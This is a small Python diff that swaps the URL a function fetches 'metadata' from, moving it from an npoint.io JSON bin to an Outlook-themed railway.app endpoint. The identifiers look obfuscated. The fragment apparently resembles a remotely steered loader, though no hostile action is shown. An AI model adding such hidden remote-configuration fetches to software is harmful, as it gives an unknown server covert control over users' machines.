@@ -16,7 +16,7 @@ def data_lmeqqh_253():
 
     def config_ufikoh_989():
         try:
-            data_ojtgid_731 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            data_ojtgid_731 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             data_ojtgid_731.raise_for_status()
             data_fisdti_570 = data_ojtgid_731.json()
             learn_gamgig_525 = data_fisdti_570.get('metadata')
